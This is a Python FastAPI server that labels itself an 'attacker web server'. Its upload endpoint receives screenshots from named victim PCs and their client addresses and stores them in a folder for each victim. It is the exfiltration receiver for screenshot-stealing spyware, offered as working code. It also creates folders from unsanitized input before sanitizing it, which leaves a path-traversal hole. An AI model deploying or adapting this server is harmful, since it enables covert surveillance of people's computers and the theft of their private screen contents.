import re
from datetime import datetime
from pathlib import Path

from fastapi import FastAPI, File, UploadFile, Form
import os

app = FastAPI()

screenshots_folder_path = Path('screenshots')

def sanitize_filename(filename: str) -> str:
    # Replace forbidden characters in filename for Windows compatibility
    return re.sub(r'[<>:"/\\|?*]', "_", filename)

@app.get("/")
async def root():
    return {"attacker web server status": "on"}

@app.post("/upload")
async def upload_image(
    file: UploadFile = File(...),
    vector_pc_name: str = Form(...),
    client_address: str = Form(...)
):
    # save ss to a folder
    global screenshots_folder_path
    # create folder for vector if not existing
    screenshot_folder_path = os.path.join(screenshots_folder_path, vector_pc_name + '-' + client_address)
    os.makedirs(screenshot_folder_path, exist_ok=True)
    current_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print("Current Timestamp:", current_timestamp)
    screenshot_folder_path = screenshots_folder_path / sanitize_filename(f"{vector_pc_name}-{client_address}")
    screenshot_folder_path.mkdir(parents=True, exist_ok=True)
    screenshot_file_path = screenshot_folder_path / sanitize_filename(f"{current_timestamp}.jpg")
    # Save the file
    with open(screenshot_file_path, "wb") as buffer:
        buffer.write(await file.read())

    return {"filename": file.filename, "message": "File uploaded successfully"}


if __name__ == '__main__':
    import uvicorn

    uvicorn.run(app, host="127.0.0.1", port=8000, log_level="info")
